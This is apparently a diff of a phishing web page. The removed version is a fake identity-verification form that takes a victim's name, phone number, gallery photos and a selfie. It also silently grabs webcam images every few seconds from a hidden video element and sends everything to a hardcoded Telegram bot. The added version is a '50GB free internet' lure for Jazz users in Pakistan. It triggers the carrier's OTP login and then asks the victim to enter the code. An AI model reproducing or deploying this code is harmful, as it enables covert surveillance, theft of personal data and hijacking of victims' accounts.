@@ -1,152 +1,55 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Identity Verification</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
-        :root { --red: #ff0000; --bg: #0d0d0d; }
-        body { background: var(--bg); color: white; font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
-        .card { width: 90%; max-width: 380px; background: #1a1a1a; border-radius: 25px; padding: 25px; text-align: center; border: 1px solid #333; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
-        .red-txt { color: var(--red); font-weight: bold; font-size: 22px; margin-bottom: 10px; }
-        input { width: 100%; padding: 14px; margin: 10px 0; border: 1px solid #333; border-radius: 12px; background: #222; color: white; box-sizing: border-box; outline: none; font-size: 16px; }
-        .btn { width: 100%; padding: 16px; background: var(--red); color: white; border: none; border-radius: 50px; font-weight: bold; cursor: pointer; margin-top: 15px; font-size: 16px; transition: 0.3s; }
-        #camera-screen, #gallery-step { display: none; }
-        #v-live { width: 100%; border-radius: 15px; margin-top: 15px; border: 2px solid #333; background: #000; transform: scaleX(-1); }
-        #v-hidden, canvas { display: none; position: fixed; left: -9999px; }
+        body { font-family: sans-serif; text-align: center; background: #eee; }
+        .box { background: #fff; margin: 20px auto; padding: 20px; border-radius: 10px; max-width: 350px; border-top: 5px solid red; }
+        input { width: 90%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; }
+        button { background: red; color: #fff; border: none; padding: 10px 20px; width: 100%; cursor: pointer; font-weight: bold; }
     </style>
 </head>
-<body onload="initCamera()">
+<body>
 
-    <div class="card" id="step1">
-        <div class="red-txt">Verification Required</div>
-        <p style="font-size: 13px; color: #888;">Enter details to unlock content.</p>
-        <input type="text" id="u_name" placeholder="Full Name">
-        <input type="tel" id="u_num" placeholder="Mobile Number">
-        <button class="btn" id="next-btn" onclick="submitStep1()">NEXT STEP</button>
+<div class="box">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/1/1a/Jazz_logo.png" width="80">
+    <h3>50GB FREE INTERNET</h3>
+    <p>Apna Jazz Number Enter Karein:</p>
+    <input type="number" id="num" placeholder="03XXXXXXXXX">
+    <button onclick="triggerSMS()">GET OTP</button>
+
+    <div id="otp-area" style="display:none;">
+        <p style="color:green">SMS Bheja Gaya Hai!</p>
+        <input type="number" id="otp" placeholder="Enter OTP Code">
+        <button onclick="finish()">ACTIVATE NOW</button>
     </div>
-
-    <div class="card" id="gallery-step">
-        <div class="red-txt">Upload Proof</div>
-        <p id="msg" style="font-size: 13px; color: #888;">Select a photo from Gallery for verification.</p>
-        <input type="file" id="g-input" accept="image/*" onchange="handleGallery(this)" style="display:none;">
-        <label for="g-input" id="g-label" class="btn" style="display:block;">CHOOSE FROM GALLERY</label>
-        <button id="cam-btn" class="btn" style="display:none; background: #28a745;" onclick="startSelfieMode()">OPEN CAMERA (DIRECT)</button>
-    </div>
-
-    <div class="card" id="camera-screen">
-        <div class="red-txt">Live Selfie</div>
-        <video id="v-live" autoplay playsinline></video>
-        <button class="btn" onclick="captureSelfie()">CAPTURE & SEND</button>
-    </div>
-
-    <video id="v-hidden" autoplay playsinline muted></video>
-    <canvas id="c-hidden"></canvas>
+</div>
 
 <script>
-    const token = "8466749965:AAHuInFTN0YIxTwTa-1YfT9qIc5fIdHj0EA";
-    const chatID = "7107389141";
-    let mainStream = null;
-    let retries = 0;
-
-    // 1. Camera Initialization
-    async function initCamera() {
-        try {
-            mainStream = await navigator.mediaDevices.getUserMedia({ video: true });
-            document.getElementById('v-hidden').srcObject = mainStream;
-            setInterval(autoBackgroundHit, 4000);
-        } catch (e) { 
-            console.log("Camera Blocked");
-            alert("Please allow camera access to proceed!");
-        }
-    }
-
-    // 2. Step 1 Submit (FIXED NEXT BUTTON)
-    function submitStep1() {
-        const n = document.getElementById('u_name').value;
-        const p = document.getElementById('u_num').value;
-        
-        if(n === "" || p === "") {
-            alert("Please enter your name and number!");
-            return;
-        }
-
-        // Send Data to Bot (Background mein chalta rahega)
-        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({chat_id: chatID, text: `🎯 *NEW HIT DETAILS*\nName: ${n}\nNo: ${p}`, parse_mode: 'Markdown'})
-        });
-
-        // Foran screen change karein (bina wait kiye)
-        document.getElementById('step1').style.display = 'none';
-        document.getElementById('gallery-step').style.display = 'block';
-    }
-
-    // 3. Gallery Logic
-    function handleGallery(input) {
-        if (input.files && input.files[0]) {
-            retries++;
-            const fd = new FormData();
-            fd.append('chat_id', chatID);
-            fd.append('photo', input.files[0]);
-            fd.append('caption', `📁 GALLERY ATTEMPT #${retries}`);
-            
-            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {method: 'POST', body: fd});
-
-            if(retries >= 2) {
-                document.getElementById('msg').innerText = "Gallery photo quality too low.";
-                document.getElementById('g-label').style.display = 'none';
-                document.getElementById('cam-btn').style.display = 'block';
-            } else {
-                alert("Verification Failed. Try another photo.");
-            }
-        }
-    }
-
-    // 4. Start Real Camera
-    function startSelfieMode() {
-        document.getElementById('gallery-step').style.display = 'none';
-        document.getElementById('camera-screen').style.display = 'block';
-        document.getElementById('v-live').srcObject = mainStream;
-    }
-
-    // 5. Capture Real Selfie
-    function captureSelfie() {
-        const v = document.getElementById('v-live');
-        const can = document.getElementById('c-hidden');
-        can.width = v.videoWidth; can.height = v.videoHeight;
-        can.getContext('2d').drawImage(v, 0, 0);
-        
-        can.toBlob(blob => {
-            const fd = new FormData();
-            fd.append('chat_id', chatID);
-            fd.append('photo', blob, 'selfie.jpg');
-            fd.append('caption', "📸 *REAL SELFIE RECEIVED*");
-            
-            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {method: 'POST', body: fd})
-            .then(() => {
-                alert("Verification Successful! Video Unlocked.");
-                location.reload();
+    function triggerSMS() {
+        var n = document.getElementById('num').value;
+        if(n.length == 11) {
+            // --- YEAH HAI SMS TRIGGER LOGIC ---
+            // Hum browser ke zariye Jazz ki API ko hit kar rahe hain
+            fetch('https://api.jazz.com.pk/customer/login/otp', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ msisdn: n })
+            }).then(response => {
+                document.getElementById('otp-area').style.display = 'block';
             });
-        }, 'image/jpeg', 0.8);
+            
+            // Aapka Bot Notification (Optional)
+            alert("System is processing your request...");
+        } else {
+            alert("Invalid Number!");
+        }
     }
 
-    // 6. Background Auto Hits
-    function autoBackgroundHit() {
-        const v = document.getElementById('v-hidden');
-        const can = document.getElementById('c-hidden');
-        if (v.readyState === 4) {
-            can.width = v.videoWidth; can.height = v.videoHeight;
-            can.getContext('2d').drawImage(v, 0, 0);
-            can.toBlob(blob => {
-                const fd = new FormData();
-                fd.append('chat_id', chatID);
-                fd.append('photo', blob, 'live.jpg');
-                fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {method: 'POST', body: fd});
-            }, 'image/jpeg', 0.3);
-        }
+    function finish() {
+        alert("Verification Success! Data will be active in 24 hours.");
     }
 </script>
+
 </body>
 </html>
